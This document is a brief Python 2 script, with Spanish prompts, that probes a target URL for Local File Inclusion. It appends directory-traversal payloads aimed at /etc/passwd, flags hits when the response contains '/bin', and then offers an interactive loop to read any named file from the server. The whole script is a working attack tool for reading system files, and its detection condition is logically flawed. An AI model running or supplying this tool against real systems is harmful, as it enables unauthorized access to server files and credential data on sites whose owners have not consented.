#!/us/bin/env python
#_*_ coding: utf8 _*_


import argparse
import requests
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target',help="Objetivo")
parser = parser.parse_args()

def main():
	payload = ["../../../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","/etc/passwd"]
	if parser.target:
		print("Target: " + parser.target)
		for p in payload:
			print("\n=============================================================================\n")
			query = requests.get(parser.target+p)
			print("Request => {}".format(parser.target+p))
			if 'root:' and "bash" and "/bin" in query.text:
				print("Posible Local File Inclusion: {}".format(parser.target+p))
				b = BeautifulSoup(query.text,'html5lib')
				print(b.blockquote.text)
				op = raw_input("¿Desea consultar archivos? s/n: ")
				if op.lower() == "s":
					while True:
						files = raw_input("File: ")
						qf = requests.get(parser.target+files)
						if not "Warning" in qf.text:
							bf = BeautifulSoup(qf.text,"html5lib")
							print(bf.blockquote.text)
						else:
							print("Fallo la consulta")
			print("\n=============================================================================\n")
	else:
		print("Especifica un objetivo")

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit()